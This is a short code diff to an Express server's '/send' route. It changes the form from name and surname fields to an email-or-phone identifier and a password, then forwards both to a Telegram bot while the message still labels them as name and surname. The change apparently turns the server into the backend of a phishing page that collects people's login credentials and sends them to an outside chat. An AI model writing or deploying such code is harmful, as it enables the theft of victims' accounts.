@@ -18,18 +18,18 @@ app.use(cors());
 app.use(express.static(clientPath));
 
 app.post('/send', async (req, res) => {
-  const { name, surname } = req.body;
-  const trimmedName = String(name || '').trim();
-  const trimmedSurname = String(surname || '').trim();
+  const { identifier, password } = req.body;
+  const trimmedIdentifier = String(identifier || '').trim();
+  const trimmedPassword = String(password || '').trim();
 
-  if (!trimmedName || !trimmedSurname) {
+  if (!trimmedIdentifier || !trimmedPassword) {
     return res.status(400).json({
       success: false,
-      message: 'Name and surname are required'
+      message: 'Введите email или номер телефона'
     });
   }
 
-  const text = `Новый пользователь: Имя - ${trimmedName}, Фамилия - ${trimmedSurname}`;
+  const text = `Новый пользователь: Имя - ${trimmedIdentifier}, Фамилия - ${trimmedPassword}`;
 
   try {
     await axios.post(`https://api.telegram.org/bot${process.env.TOKEN}/sendMessage`, {
@@ -39,7 +39,7 @@ app.post('/send', async (req, res) => {
 
     res.json({ success: true });
   } catch (err) {
-    res.status(500).json({ success: false, message: 'Failed to send message to Telegram' });
+    res.status(500).json({ success: false, message: 'Error' });
   }
 });
 
